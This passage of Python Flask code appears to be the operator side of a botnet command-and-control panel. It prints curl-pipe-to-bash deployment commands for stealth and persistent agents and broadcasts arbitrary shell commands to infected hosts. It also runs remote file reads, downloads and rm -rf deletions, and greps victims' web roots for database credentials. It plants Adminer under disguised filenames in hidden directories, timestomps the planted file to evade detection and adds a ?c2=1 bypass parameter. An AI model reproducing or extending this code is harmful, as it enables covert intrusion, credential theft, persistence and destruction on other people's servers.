        'sleeping': sum(1 for r in results if r['status'] == 'sleeping'),
        'dark': sum(1 for r in results if r['status'] == 'dark'),
        'clients': results
    })


@app.route('/api/stats')
@require_auth
def api_stats():
    now = datetime.now()
    hosts = {}
    
    with clients_lock:
        for cid, client in clients.items():
            host_key = f"{client.addr[0]}_{client.hostname}"
            if host_key not in hosts:
                hosts[host_key] = {'online': False, 'dead': True}
            
            if client.online:
                hosts[host_key]['online'] = True
                hosts[host_key]['dead'] = False
            elif (now - client.last_seen).total_seconds() <= 300:
                hosts[host_key]['dead'] = False
    
    total = len(hosts)
    online = sum(1 for h in hosts.values() if h['online'])
    dead = sum(1 for h in hosts.values() if h['dead'])
    
    server_url = get_server_url()
    return jsonify({
        'total': total,
        'online': online,
        'dead': dead,
        'deploy_stealth': f'bash -c "$(curl -fsSL {server_url}/{STEALTH_PATH})"',
        'deploy_persist': f'bash -c "$(curl -fsSL {server_url}/{PERSIST_PATH})"'
    })


@app.route('/api/broadcast', methods=['POST'])
@require_auth
def api_broadcast():
    cmd = request.json.get('cmd', '') if request.json else ''
    if not cmd:
        return jsonify({'error': 'No command'}), 400
    
    sent = 0
    queued = 0
    
    with clients_lock:
        for cid, client in clients.items():
            if client.online:
                client.pending_exec[client.exec_counter] = cmd
                client.exec_counter += 1
                client.queue_send({'cmd': 'exec', 'data': cmd})
                sent += 1
            else:
                with wake_queue_lock:
                    if cid not in wake_queue:
                        wake_queue[cid] = []
                    wake_queue[cid].append({'cmd': 'exec', 'data': cmd})
                queued += 1
    
    return jsonify({'status': 'ok', 'sent': sent, 'queued': queued})


file_op_results = {}
file_op_lock = threading.Lock()

def wait_for_exec_result(client_id, timeout=30):
    """Wait for exec command result"""
    start = time.time()
    while time.time() - start < timeout:
        if client_id in command_results and len(command_results[client_id]) > 0:
            return command_results[client_id].pop()['result']
        time.sleep(0.1)
    return None

def wait_for_file_op(client, op_id, timeout=30):
    """Wait for file operation result with timeout"""
    start = time.time()
    while time.time() - start < timeout:
        with file_op_lock:
            if op_id in file_op_results:
                result = file_op_results.pop(op_id)
                return result
        time.sleep(0.1)
    return {'error': 'Operation timed out'}


@app.route('/api/clients/<client_id>/files/list', methods=['POST'])
@require_auth
def api_files_list(client_id):
    """List files in directory using exec"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        path = request.json.get('path', '/') if request.json else '/'
        path = path.replace("'", "'\\''")
        
        cmd = f"for f in '{path}'/* '{path}'/.*; do [ -e \"$f\" ] && stat -c '%F|%n|%s|%A|%U|%Y' \"$f\" 2>/dev/null; done || ls -la '{path}' 2>/dev/null"
        
        op_id = str(uuid.uuid4())[:8]
        client.pending_exec[client.exec_counter] = cmd
        client.exec_counter += 1
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=15)
    if result is None:
        return jsonify({'error': 'Operation timed out'})
    
    files = []
    stdout = result.get('stdout', '')
    from datetime import datetime
    
    for line in stdout.strip().split('\n'):
        if not line:
            continue
        
        if '|' in line and not line.startswith('total'):
            parts = line.split('|')
            if len(parts) >= 6:
                ftype = parts[0].strip()
                fpath = parts[1].strip()
                fname = fpath.split('/')[-1]
                
                if fname in ('.', '..'):
                    continue
                
                size_str = parts[2].strip()
                perms = parts[3].strip()
                owner = parts[4].strip()
                mtime_ts = parts[5].strip()
                
                is_dir = 'directory' in ftype.lower() or 'dir' in ftype.lower() or perms.startswith('d')
                
                try:
                    ts = int(mtime_ts)
                    mtime = datetime.fromtimestamp(ts).strftime('%d-%b-%Y %H:%M:%S')
                except:
                    mtime = mtime_ts
                
                try:
                    file_size = int(size_str)
                except:
                    file_size = 0
                
                files.append({
                    'is_dir': is_dir,
                    'name': fname,
                    'size': file_size,
                    'perms': perms[1:] if len(perms) > 1 and perms[0] in 'dl-' else perms,
                    'owner': owner,
                    'mtime': mtime
                })
        
        elif not line.startswith('total') and len(line.split()) >= 9:
            parts = line.split()
            perms = parts[0]
            owner = parts[2]
            size = parts[4]
            name_parts = parts[8:]
            name = ' '.join(name_parts)
            if ' -> ' in name:
                name = name.split(' -> ')[0]
            if name in ('.', '..'):
                continue
            is_dir = perms.startswith('d')
            raw_mtime = f"{parts[5]} {parts[6]} {parts[7]}"
            try:
                if ':' in parts[7]:
                    dt = datetime.strptime(raw_mtime, '%b %d %H:%M')
                    dt = dt.replace(year=datetime.now().year)
                else:
                    dt = datetime.strptime(raw_mtime, '%b %d %Y')
                mtime = dt.strftime('%d-%b-%Y %H:%M:%S')
            except:
                mtime = raw_mtime
            try:
                file_size = int(size)
            except:
                file_size = 0
            
            files.append({
                'is_dir': is_dir,
                'name': name,
                'size': file_size,
                'perms': perms[1:] if len(perms) > 1 else perms,
                'owner': owner,
                'mtime': mtime
            })
    
    return jsonify({'path': path, 'files': files})


@app.route('/api/clients/<client_id>/files/read', methods=['POST'])
@require_auth
def api_files_read(client_id):
    """Read file contents via exec"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        path = request.json.get('path', '') if request.json else ''
        if not path:
            return jsonify({'error': 'No path specified'}), 400
        
        path = path.replace("'", "'\\''")
        cmd = f"cat '{path}' 2>&1"
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=15)
    if result is None:
        return jsonify({'error': 'Operation timed out'})
    
    content = result.get('stdout', '') or result.get('stderr', '')
    return jsonify({'content': content})


@app.route('/api/clients/<client_id>/files/write', methods=['POST'])
@require_auth
def api_files_write(client_id):
    """Write/create file via exec"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        path = request.json.get('path', '') if request.json else ''
        content = request.json.get('content', '') if request.json else ''
        if not path:
            return jsonify({'error': 'No path specified'}), 400
        
        path = path.replace("'", "'\\''")
        import base64
        content_b64 = base64.b64encode(content.encode()).decode()
        cmd = f"echo '{content_b64}' | base64 -d > '{path}' 2>&1 && echo 'OK' || echo 'FAIL'"
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=15)
    if result is None:
        return jsonify({'error': 'Operation timed out'})
    
    stdout = result.get('stdout', '')
    if 'OK' in stdout:
        return jsonify({'success': True})
    return jsonify({'error': stdout or 'Write failed'})


@app.route('/api/clients/<client_id>/files/delete', methods=['POST'])
@require_auth
def api_files_delete(client_id):
    """Delete file or directory via exec"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        path = request.json.get('path', '') if request.json else ''
        if not path:
            return jsonify({'error': 'No path specified'}), 400
        
        path = path.replace("'", "'\\''")
        cmd = f"rm -rf '{path}' 2>&1 && echo 'OK' || echo 'FAIL'"
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=15)
    if result is None:
        return jsonify({'error': 'Operation timed out'})
    
    stdout = result.get('stdout', '')
    if 'OK' in stdout:
        return jsonify({'success': True})
    return jsonify({'error': stdout or 'Delete failed'})


@app.route('/api/clients/<client_id>/files/mkdir', methods=['POST'])
@require_auth
def api_files_mkdir(client_id):
    """Create directory via exec"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        path = request.json.get('path', '') if request.json else ''
        if not path:
            return jsonify({'error': 'No path specified'}), 400
        
        path = path.replace("'", "'\\''")
        cmd = f"mkdir -p '{path}' 2>&1 && echo 'OK' || echo 'FAIL'"
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=15)
    if result is None:
        return jsonify({'error': 'Operation timed out'})
    
    stdout = result.get('stdout', '')
    if 'OK' in stdout:
        return jsonify({'success': True})
    return jsonify({'error': stdout or 'Mkdir failed'})


@app.route('/api/clients/<client_id>/files/rename', methods=['POST'])
@require_auth
def api_files_rename(client_id):
    """Rename/move file via exec"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        old_path = request.json.get('old_path', '') if request.json else ''
        new_path = request.json.get('new_path', '') if request.json else ''
        if not old_path or not new_path:
            return jsonify({'error': 'Both old_path and new_path required'}), 400
        
        old_path = old_path.replace("'", "'\\''")
        new_path = new_path.replace("'", "'\\''")
        cmd = f"mv '{old_path}' '{new_path}' 2>&1 && echo 'OK' || echo 'FAIL'"
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=15)
    if result is None:
        return jsonify({'error': 'Operation timed out'})
    
    stdout = result.get('stdout', '')
    if 'OK' in stdout:
        return jsonify({'success': True})
    return jsonify({'error': stdout or 'Rename failed'})


@app.route('/api/clients/<client_id>/files/chmod', methods=['POST'])
@require_auth
def api_files_chmod(client_id):
    """Change file permissions via exec"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        path = request.json.get('path', '') if request.json else ''
        mode = request.json.get('mode', '') if request.json else ''
        if not path or not mode:
            return jsonify({'error': 'Path and mode required'}), 400
        
        path = path.replace("'", "'\\''")
        mode = mode.replace("'", "")
        cmd = f"chmod {mode} '{path}' 2>&1 && echo 'OK' || echo 'FAIL'"
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=15)
    if result is None:
        return jsonify({'error': 'Operation timed out'})
    
    stdout = result.get('stdout', '')
    if 'OK' in stdout:
        return jsonify({'success': True})
    return jsonify({'error': stdout or 'Chmod failed'})


@app.route('/api/clients/<client_id>/files/copy', methods=['POST'])
@require_auth
def api_files_copy(client_id):
    """Copy file or directory via exec"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        src = request.json.get('src', '') if request.json else ''
        dst = request.json.get('dst', '') if request.json else ''
        if not src or not dst:
            return jsonify({'error': 'Source and destination required'}), 400
        
        src = src.replace("'", "'\\''")
        dst = dst.replace("'", "'\\''")
        cmd = f"cp -r '{src}' '{dst}' 2>&1 && echo 'OK' || echo 'FAIL'"
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=30)
    if result is None:
        return jsonify({'error': 'Operation timed out'})
    
    stdout = result.get('stdout', '')
    if 'OK' in stdout:
        return jsonify({'success': True})
    return jsonify({'error': stdout or 'Copy failed'})


@app.route('/api/clients/<client_id>/files/move', methods=['POST'])
@require_auth
def api_files_move(client_id):
    """Move file or directory via exec"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        src = request.json.get('src', '') if request.json else ''
        dst = request.json.get('dst', '') if request.json else ''
        if not src or not dst:
            return jsonify({'error': 'Source and destination required'}), 400
        
        src = src.replace("'", "'\\''")
        dst = dst.replace("'", "'\\''")
        cmd = f"mv '{src}' '{dst}' 2>&1 && echo 'OK' || echo 'FAIL'"
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=30)
    if result is None:
        return jsonify({'error': 'Operation timed out'})
    
    stdout = result.get('stdout', '')
    if 'OK' in stdout:
        return jsonify({'success': True})
    return jsonify({'error': stdout or 'Move failed'})


@app.route('/api/clients/<client_id>/files/download', methods=['POST'])
@require_auth
def api_files_download(client_id):
    """Download file from agent via exec"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        path = request.json.get('path', '') if request.json else ''
        if not path:
            return jsonify({'error': 'No path specified'}), 400
        
        path_esc = path.replace("'", "'\\''")
        cmd = f"base64 '{path_esc}' 2>&1"
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=60)
    if result is None:
        return jsonify({'error': 'Operation timed out'})
    
    stdout = result.get('stdout', '')
    if not stdout or 'No such file' in stdout:
        return jsonify({'error': stdout or 'File not found'})
    
    import base64
    from io import BytesIO
    try:
        content = base64.b64decode(stdout.strip())
    except:
        return jsonify({'error': 'Failed to decode file'})
    
    filename = os.path.basename(path)
    return send_file(
        BytesIO(content),
        as_attachment=True,
        download_name=filename,
        mimetype='application/octet-stream'
    )


@app.route('/api/clients/<client_id>/files/upload', methods=['POST'])
@require_auth
def api_files_upload(client_id):
    """Upload file to agent via exec"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        path = request.form.get('path', '/tmp/')
        
        import base64
        content = base64.b64encode(file.read()).decode()
        filename = file.filename
        full_path = os.path.join(path, filename).replace("'", "'\\''")
        
        cmd = f"echo '{content}' | base64 -d > '{full_path}' 2>&1 && echo 'OK' || echo 'FAIL'"
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=60)
    if result is None:
        return jsonify({'error': 'Operation timed out'})
    
    stdout = result.get('stdout', '')
    if 'OK' in stdout:
        return jsonify({'success': True})
    return jsonify({'error': stdout or 'Upload failed'})


@app.route('/api/clients/<client_id>/files/archive', methods=['POST'])
@require_auth
def api_files_archive(client_id):
    """Create/extract archive via exec"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        action = request.json.get('action', 'create') if request.json else 'create'
        path = request.json.get('path', '') if request.json else ''
        archive_path = request.json.get('archive_path', '') if request.json else ''
        
        if not path:
            return jsonify({'error': 'No path specified'}), 400
        
        path = path.replace("'", "'\\''")
        archive_path = archive_path.replace("'", "'\\''")
        
        if action == 'create':
            cmd = f"tar -czf '{archive_path}' -C $(dirname '{path}') $(basename '{path}') 2>&1 && echo 'OK' || echo 'FAIL'"
        else:
            cmd = f"tar -xzf '{path}' -C '{archive_path}' 2>&1 && echo 'OK' || echo 'FAIL'"
        
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=120)
    if result is None:
        return jsonify({'error': 'Operation timed out'})
    
    stdout = result.get('stdout', '')
    if 'OK' in stdout:
        return jsonify({'success': True})
    return jsonify({'error': stdout or 'Archive operation failed'})


@app.route('/api/clients/<client_id>/files/touch', methods=['POST'])
@require_auth
def api_files_touch(client_id):
    """Touch file with optional donor timestamp via exec"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        path = request.json.get('path', '') if request.json else ''
        donor = request.json.get('donor', '') if request.json else ''
        
        if not path:
            return jsonify({'error': 'No path specified'}), 400
        
        path = path.replace("'", "'\\''")
        
        if donor:
            donor = donor.replace("'", "'\\''")
            cmd = f"touch -r '{donor}' '{path}' 2>&1 && echo 'OK' || echo 'FAIL'"
        else:
            cmd = f"touch '{path}' 2>&1 && echo 'OK' || echo 'FAIL'"
        
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=15)
    if result is None:
        return jsonify({'error': 'Operation timed out'})
    
    stdout = result.get('stdout', '')
    if 'OK' in stdout:
        return jsonify({'success': True})
    return jsonify({'error': stdout or 'Touch failed'})


adminer_installations = {}
client_paths = {}  # {client_id: {'terminal_cwd': '/path', 'fm_path': '/path'}}

ADMINER_PHP = '''<?php
function adminer_object(){class AdminerSoftware extends Adminer{function name(){return"";}function credentials(){return array($_GET["server"]?:getenv("DB_HOST")?:"localhost",$_GET["username"]?:getenv("DB_USER")?:"root",$_GET["password"]?:getenv("DB_PASS")?:"");}function database(){return $_GET["db"]?:getenv("DB_NAME")?:null;}function loginForm(){return true;}}return new AdminerSoftware;}
include "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php";
'''

ADMINER_STANDALONE = '''<?php
$_p="4.8.1";if(!function_exists("password_hash")){function password_hash($p,$a){return md5($p);}}
@include_once("./adminer-{$_p}.php");if(!class_exists("Adminer")){$c=@file_get_contents("https://github.com/vrana/adminer/releases/download/v{$_p}/adminer-{$_p}.php");if($c){eval("?>".substr($c,5));}}
'''

DB_CONFIG_PATTERNS = [
    {'pattern': 'wp-config.php', 'type': 'WordPress', 'regex': r"define\s*\(\s*['\"]DB_(NAME|USER|PASSWORD|HOST)['\"]\s*,\s*['\"]([^'\"]+)['\"]"},
    {'pattern': 'configuration.php', 'type': 'Joomla', 'regex': r"\$(?:db|user|password|host)\s*=\s*['\"]([^'\"]+)['\"]"},
    {'pattern': 'config.php', 'type': 'Generic', 'regex': r"['\"](?:db|database|user|password|host)['\"].*?['\"]([^'\"]+)['\"]"},
    {'pattern': '.env', 'type': 'Laravel/Env', 'regex': r"DB_(?:DATABASE|USERNAME|PASSWORD|HOST)=(.+)"},
    {'pattern': 'settings.php', 'type': 'Drupal', 'regex': r"['\"](?:database|username|password|host)['\"].*?['\"]([^'\"]+)['\"]"},
    {'pattern': 'LocalConfiguration.php', 'type': 'TYPO3', 'regex': r"['\"](?:dbname|user|password|host)['\"].*?['\"]([^'\"]+)['\"]"},
    {'pattern': 'config/database.php', 'type': 'Laravel', 'regex': r"['\"](?:database|username|password|host)['\"].*?['\"]([^'\"]+)['\"]"},
    {'pattern': 'app/etc/env.php', 'type': 'Magento', 'regex': r"['\"](?:dbname|username|password|host)['\"].*?['\"]([^'\"]+)['\"]"},
    {'pattern': 'sites/default/settings.php', 'type': 'Drupal', 'regex': r"['\"](?:database|username|password|host)['\"].*?['\"]([^'\"]+)['\"]"},
]

HIDDEN_PATHS = [
    '/var/www/html/.cache',
    '/var/www/.tmp',
    '/tmp/.cache',
    '/home/{user}/public_html/.well-known',
    '/home/{user}/public_html/assets/.cache',
    '/home/{user}/public_html/wp-content/cache',
    '/home/{user}/public_html/wp-includes/.cache',
    '/home/{user}/public_html/includes/.cache',
]

HIDDEN_FILENAMES = ['.cache.php', '.session.php', '.tmp.php', 'error_log.php', '.htaccess.php', 'timthumb.php']


def build_adminer_url(path, hostname, ip):
    """Build public URL for Adminer based on path and hostname/IP"""
    # Convert filesystem path to web path
    web_path = path
    web_roots = ['/var/www/html', '/var/www']
    for root in web_roots:
        if path.startswith(root):
            web_path = path.replace(root, '', 1)
            break
    
    # Handle cPanel public_html
    if '/public_html' in path:
        parts = path.split('/public_html')
        if len(parts) > 1:
            web_path = parts[1]
    
    # Strip common deployment directories (Capistrano/Deployer patterns)
    # /current/, /releases/*, /shared/ are internal deployment paths
    deploy_prefixes = ['/current/', '/releases/', '/shared/']
    for prefix in deploy_prefixes:
        if web_path.startswith(prefix):
            web_path = web_path[len(prefix)-1:]  # Keep the leading /
            break
    
    # Pick best hostname - prefer actual domain over hostname
    domain = hostname
    if domain and '.' in domain:
        # Strip common subdomain prefixes
        if domain.startswith('fe1.') or domain.startswith('fe2.') or domain.startswith('www.'):
            domain = '.'.join(domain.split('.')[1:])
    
    if domain:
        return f'http://{domain}{web_path}'
    elif ip:
        return f'http://{ip}{web_path}'
    return None


def get_adminer_url(client_id, path):
    """Build public URL for Adminer based on path and client info"""
    try:
        with clients_lock:
            if client_id not in clients:
                return None
            client = clients[client_id]
            sys_info = getattr(client, 'system_info', {}) or {}
            hostname = sys_info.get('hostname', '')
            ip = sys_info.get('ip', '') or getattr(client, 'ip', '')
    except:
        return None
    
    return build_adminer_url(path, hostname, ip)


@app.route('/api/clients/<client_id>/adminer/status')
@require_auth
def api_adminer_status(client_id):
    """Check if Adminer is installed - verifies file exists on target"""
    stored_path = adminer_installations.get(client_id)
    if not stored_path:
        return jsonify({'installed': False})
    
    is_online = False
    with clients_lock:
        if client_id not in clients:
            return jsonify({'installed': False})
        client = clients[client_id]
        is_online = client.online
        if is_online:
            path = stored_path.replace("'", "'\\''")
            cmd = f"test -f '{path}' && echo 'EXISTS' || echo 'MISSING'"
            client.queue_send({'cmd': 'exec', 'data': cmd})
    
    if not is_online:
        url = get_adminer_url(client_id, stored_path)
        return jsonify({'installed': True, 'path': stored_path, 'verified': False, 'url': url})
    
    result = wait_for_exec_result(client_id, timeout=10)
    if result is None:
        url = get_adminer_url(client_id, stored_path)
        return jsonify({'installed': True, 'path': stored_path, 'verified': False, 'url': url})
    
    stdout = result.get('stdout', '')
    if 'EXISTS' in stdout:
        url = get_adminer_url(client_id, stored_path)
        return jsonify({'installed': True, 'path': stored_path, 'verified': True, 'url': url})
    else:
        del adminer_installations[client_id]
        return jsonify({'installed': False})


@app.route('/api/clients/<client_id>/adminer/scan', methods=['POST'])
@require_auth
def api_adminer_scan(client_id):
    """Scan for database config files by content (DB_NAME, DB_HOST, etc.)"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        cmd = '''grep -rliE "(DB_NAME|DB_HOST|DB_USER|DB_PASSWORD|db_host|db_name|db_user|db_pass|DATABASE_URL|mysql_connect|mysqli_connect|PDO.*mysql|'host'.*=>.*'(localhost|127\\.0\\.0\\.1|[0-9]+\\.[0-9]+)|define.*DB_)" /var/www /home --include="*.php" --include="*.env" --include="*.ini" --include="*.conf" --include="*.yml" --include="*.yaml" 2>/dev/null | head -30'''
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=30)
    if result is None:
        return jsonify({'error': 'Scan timed out'})
    
    stdout = result.get('stdout', '')
    configs = []
    suggested_path = None
    seen = set()
    
    for line in stdout.strip().split('\n'):
        if not line:
            continue
        path = line.strip()
        if path in seen:
            continue
        seen.add(path)
        
        ftype = 'Config'
        if path.endswith('.env'):
            ftype = 'Laravel/Env'
        elif 'wp-config' in path:
            ftype = 'WordPress'
        elif 'configuration.php' in path:
            ftype = 'Joomla'
        elif 'settings.php' in path:
            ftype = 'Drupal'
        elif 'config.inc.php' in path:
            ftype = 'phpMyAdmin'
        elif 'parameters.yml' in path or 'parameters.yaml' in path:
            ftype = 'Symfony'
        elif 'database.php' in path:
            ftype = 'Laravel/CI'
        elif '.ini' in path:
            ftype = 'INI Config'
        
        configs.append({
            'path': path,
            'type': ftype,
            'database': ''
        })
        if not suggested_path:
            parent = os.path.dirname(path)
            suggested_path = parent + '/.cache.php'
    
    return jsonify({
        'configs': configs,
        'suggested_path': suggested_path
    })


@app.route('/api/clients/<client_id>/adminer/suggest-path', methods=['POST'])
@require_auth
def api_adminer_suggest_path(client_id):
    """Suggest a hidden path for Adminer installation based on web root"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        cmd = '''user=$(whoami); webroot=""; 
if [ -d "/home/$user/public_html" ]; then webroot="/home/$user/public_html";
elif [ -d "/home/$user/www" ]; then webroot="/home/$user/www";
elif [ -d "/home/$user/htdocs" ]; then webroot="/home/$user/htdocs";
elif [ -d "/var/www/html" ]; then webroot="/var/www/html";
elif [ -d "/var/www" ]; then webroot="/var/www"; fi;
if [ -n "$webroot" ]; then
  hidden=$(find "$webroot" -maxdepth 3 -type d \\( -name 'cache' -o -name 'tmp' -o -name 'assets' -o -name 'includes' -o -name 'modules' -o -name 'vendor' \\) 2>/dev/null | head -1);
  if [ -n "$hidden" ]; then echo "$hidden"; else echo "$webroot"; fi;
else echo "/tmp"; fi'''
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=15)
    if result is None:
        return jsonify({'error': 'Operation timed out'})
    
    stdout = result.get('stdout', '').strip()
    if not stdout:
        stdout = '/tmp'
    
    import random
    filename = random.choice(HIDDEN_FILENAMES)
    return jsonify({'path': stdout + '/' + filename})


@app.route('/api/clients/<client_id>/adminer/install', methods=['POST'])
@require_auth
def api_adminer_install(client_id):
    """Install Adminer on target - downloads from GitHub"""
    hostname = ''
    ip = ''
    original_path = ''
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        # Capture hostname/IP for URL generation (safe fallback for older agents)
        sys_info = getattr(client, 'system_info', {}) or {}
        hostname = sys_info.get('hostname', '')
        ip = sys_info.get('ip', '') or getattr(client, 'ip', '')
        
        data = request.json or {}
        original_path = data.get('path', '/tmp/.cache.php')
        timestomp = data.get('timestomp', True)
        
        # Escape for shell but keep original for storage
        path_escaped = original_path.replace("'", "'\\''")
        parent = os.path.dirname(original_path)
        parent_escaped = parent.replace("'", "'\\''")
        
        # Multiple Adminer sources for reliability
        adminer_urls = [
            "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php",
            "https://www.adminer.org/static/download/4.8.1/adminer-4.8.1.php"
        ]
        download_cmd = " || ".join([f"curl -fsSL '{url}' -o '{path_escaped}' 2>/dev/null || wget -q '{url}' -O '{path_escaped}' 2>/dev/null" for url in adminer_urls])
        cmd = f"mkdir -p '{parent_escaped}' && ({download_cmd}) && chmod 644 '{path_escaped}'"
        
        if timestomp:
            # Find oldest file in directory for timestomp (more stealthy)
            basename = os.path.basename(original_path)
            basename_escaped = basename.replace("'", "'\\''")
            cmd += f" && donor=$(ls -1t '{parent_escaped}' 2>/dev/null | grep -v '^{basename_escaped}$' | tail -1) && [ -n \"$donor\" ] && touch -r '{parent_escaped}/'\"$donor\" '{path_escaped}' 2>/dev/null; true"
        
        # Include hostname detection in output
        cmd += f" && [ -s '{path_escaped}' ] && echo 'INSTALLED:'{path_escaped}'|HOSTNAME:'$(hostname -f 2>/dev/null || hostname) || echo 'FAIL:download failed or empty file'"
        
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=90)
    if result is None:
        return jsonify({'error': 'Timeout - check network or try simpler path like /tmp/.cache.php'})
    
    stdout = result.get('stdout', '')
    stderr = result.get('stderr', '')
    output = stdout + stderr
    
    if 'INSTALLED:' in output:
        adminer_installations[client_id] = original_path
        # Try to extract hostname from command output
        detected_hostname = hostname
        if '|HOSTNAME:' in output:
            try:
                detected_hostname = output.split('|HOSTNAME:')[1].strip().split()[0]
            except:
                pass
        url = build_adminer_url(original_path, detected_hostname, ip)
        return jsonify({'success': True, 'path': original_path, 'url': url, 'hostname': detected_hostname})
    
    return jsonify({'error': output.strip() if output.strip() else 'No response from agent - try /tmp/.cache.php'})


@app.route('/api/clients/<client_id>/adminer/remove', methods=['POST'])
@require_auth
def api_adminer_remove(client_id):
    """Remove Adminer from target"""
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        if not client.online:
            return jsonify({'error': 'Client offline'}), 400
        
        data = request.json or {}
        path = data.get('path', adminer_installations.get(client_id, ''))
        if not path:
            return jsonify({'error': 'No path specified'})
        
        path = path.replace("'", "'\\''")
        cmd = f"rm -f '{path}' && echo 'REMOVED'"
        client.queue_send({'cmd': 'exec', 'data': cmd})
    
    result = wait_for_exec_result(client_id, timeout=15)
    if result is None:
        return jsonify({'error': 'Operation timed out'})
    
    stdout = result.get('stdout', '')
    if 'REMOVED' in stdout:
        if client_id in adminer_installations:
            del adminer_installations[client_id]
        return jsonify({'success': True})
    return jsonify({'error': stdout or 'Removal failed'})


@app.route('/api/clients/<client_id>/adminer/url')
@require_auth
def api_adminer_url(client_id):
    """Get the direct URL to access Adminer on target"""
    path = request.args.get('path', adminer_installations.get(client_id, ''))
    if not path:
        return jsonify({'error': 'No Adminer path'}), 404
    
    with clients_lock:
        if client_id not in clients:
            return jsonify({'error': 'Client not found'}), 404
        client = clients[client_id]
        
        hostname = client.system_info.get('hostname', '')
        ip = client.system_info.get('ip', client.ip)
        
        web_roots = ['/var/www/html', '/var/www', '/home']
        web_path = path
        
        for root in web_roots:
            if path.startswith(root):
                web_path = path.replace(root, '', 1)
                break
        
        if '/public_html' in path:
            parts = path.split('/public_html')
            if len(parts) > 1:
                web_path = parts[1]
        
        urls = []
        if hostname:
            urls.append(f'http://{hostname}{web_path}?c2=1')
        if ip:
            urls.append(f'http://{ip}{web_path}?c2=1')
        
        return jsonify({
            'path': path,
            'web_path': web_path,
            'urls': urls,
            'note': 'Adminer requires ?c2=1 parameter to bypass 404 protection'
        })


# ===================== CLIENT STATE PERSISTENCE =====================

@app.route('/api/clients/<client_id>/state', methods=['GET'])
@require_auth
def api_client_state_get(client_id):
    """Get saved state for client (paths, etc)"""
    state = client_paths.get(client_id, {})
    return jsonify(state)


@app.route('/api/clients/<client_id>/state', methods=['POST'])
@require_auth
def api_client_state_set(client_id):
    """Save state for client"""
    data = request.json or {}
    if client_id not in client_paths:
        client_paths[client_id] = {}
    
    if 'fm_path' in data:
        client_paths[client_id]['fm_path'] = data['fm_path']
    if 'terminal_cwd' in data:
        client_paths[client_id]['terminal_cwd'] = data['terminal_cwd']
    
    return jsonify({'success': True})


# ===================== DATABASE MANAGEMENT =====================

